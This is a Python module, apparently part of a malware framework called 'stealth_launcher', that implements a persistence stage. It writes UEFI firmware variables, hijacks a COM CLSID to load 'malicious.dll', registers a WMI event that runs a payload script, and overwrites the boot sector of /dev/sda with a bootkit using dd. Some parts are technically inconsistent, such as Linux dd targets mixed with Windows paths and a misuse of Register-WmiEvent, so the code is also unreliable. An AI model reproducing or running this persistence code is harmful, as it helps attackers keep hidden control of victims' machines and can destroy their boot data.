#!/usr/bin/env python3

import logging
import subprocess
import ctypes
from pathlib import Path
from stealth_launcher.exceptions import StageError

# --- Constantes e primitivas low-level ---
PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x1000
WATERMARK_KEY = b"\x42\x42\x42\x42"  # Watermark padrão


# --- Helpers auxiliares ---

def is_admin() -> bool:
    """Verifica se o usuário atual é administrador."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        logging.error(f"[Persistence] Erro ao verificar privilégios de administrador: {e}")
        return False


def which(program: str) -> bool:
    """Testa se um programa existe no PATH."""
    try:
        subprocess.run([program, '--version'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except (FileNotFoundError, subprocess.CalledProcessError):
        return False


# --- Classe principal de persistência ---

class Persistence:
    def __init__(self, cfg):
        self.cfg = cfg

    def uefi_nv_var_persistence(self):
        """Persistência usando variável de firmware UEFI."""
        if not which('efivars.exe'):
            logging.warning("[Persistence] efivars.exe não encontrado. Pulando UEFI NV var persistence.")
            return
        try:
            subprocess.run([
                'efivars.exe',
                self.cfg['uefi_variable_name'],
                '--name', self.cfg['uefi_variable_name'],
                '--write', self.cfg['uefi_variable_data'].hex()
            ], check=True, timeout=10, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            logging.info(f"[Persistence] Variável UEFI '{self.cfg['uefi_variable_name']}' escrita com sucesso")
        except subprocess.CalledProcessError as e:
            logging.error(f"[Persistence] Falha ao escrever UEFI NV var: {e}")

    def com_hijack_persistence(self):
        """Persistência via hijack de CLSID COM."""
        if not which('reg.exe'):
            logging.warning("[Persistence] reg.exe não encontrado. Pulando COM hijack persistence.")
            return
        try:
            key = f"HKLM\\SOFTWARE\\Classes\\CLSID\\{self.cfg['com_clsid']}\\InprocServer32"
            subprocess.run(['reg', 'add', key, '/ve', '/d', self.cfg['com_dll_path'], '/f'],
                           check=True, timeout=10, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            logging.info(f"[Persistence] COM hijack registrado: {key}")
        except subprocess.CalledProcessError as e:
            logging.error(f"[Persistence] Falha ao registrar COM Hijack: {e}")

    def wmi_event_subscription(self):
        """Persistência via WMI event subscription."""
        if not which('powershell.exe'):
            logging.warning("[Persistence] powershell.exe não encontrado. Pulando WMI event subscription.")
            return
        try:
            ps_cmd = (
                f"Register-WmiEvent -Namespace '{self.cfg['wmi_namespace']}' "
                f"-Query \"{self.cfg['wmi_query']}\" -Action {{ & '{self.cfg['wmi_script']}' }}"
            )
            subprocess.run(['powershell', '-Command', ps_cmd],
                           check=True, timeout=10, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            logging.info(f"[Persistence] WMI event subscription criada com sucesso")
        except subprocess.CalledProcessError as e:
            logging.error(f"[Persistence] Falha ao criar WMI subscription: {e}")

    def firmware_bootkit_install(self):
        """Instala bootkit no firmware (setor de boot físico)."""
        if not which('dd'):
            logging.warning("[Persistence] dd não encontrado. Pulando firmware bootkit install.")
            return
        try:
            subprocess.run(['dd', f"if={self.cfg['bootkit_path']}", 'of=/dev/sda', 'bs=512', 'count=1'],
                           check=True, timeout=10, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            logging.info("[Persistence] Bootkit instalado com sucesso no firmware.")
        except subprocess.CalledProcessError as e:
            logging.error(f"[Persistence] Falha ao instalar bootkit: {e}")

    def rollback(self):
        """Rollback para remover persistências criadas."""
        try:
            subprocess.run(['efivars.exe', self.cfg['uefi_variable_name'], '--delete'], check=True, timeout=10)
            key = f"HKLM\\SOFTWARE\\Classes\\CLSID\\{self.cfg['com_clsid']}\\InprocServer32"
            subprocess.run(['reg', 'delete', key, '/f'], check=True, timeout=10)
            ps_cmd = (
                f"Unregister-WmiEvent -Namespace '{self.cfg['wmi_namespace']}' "
                f"-Query \"{self.cfg['wmi_query']}\""
            )
            subprocess.run(['powershell', '-Command', ps_cmd], check=True, timeout=10)
            logging.info("[Persistence] Rollback concluído com sucesso.")
        except subprocess.CalledProcessError as e:
            logging.error(f"[Persistence] Falha ao realizar rollback: {e}")


# --- Entrypoint ---

def persistence_stage(cfg):
    """Executa todas as técnicas de persistência."""
    p = Persistence(cfg)
    p.uefi_nv_var_persistence()
    p.com_hijack_persistence()
    p.wmi_event_subscription()
    p.firmware_bootkit_install()


def main():
    """Função de teste manual."""
    logging.basicConfig(level=logging.INFO)
    try:
        cfg = {
            'uefi_variable_name': 'MyAppConfig',
            'uefi_variable_data': b'\x00\x01\x02',
            'com_clsid': '{12345678-1234-1234-1234-1234567890AB}',
            'com_dll_path': 'C:\\path\\to\\malicious.dll',
            'wmi_namespace': 'root\\cimv2',
            'wmi_query': "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'",
            'wmi_script': 'C:\\path\\to\\payload_launcher.bat',
            'bootkit_path': 'C:\\path\\to\\bootkit.bin'
        }
        if not is_admin():
            raise StageError("[Persistence] Necessário ser administrador para continuar.")
        persistence_stage(cfg)
    except Exception as e:
        logging.error(f"[Persistence] Erro geral: {e}")


if __name__ == '__main__':
    main()
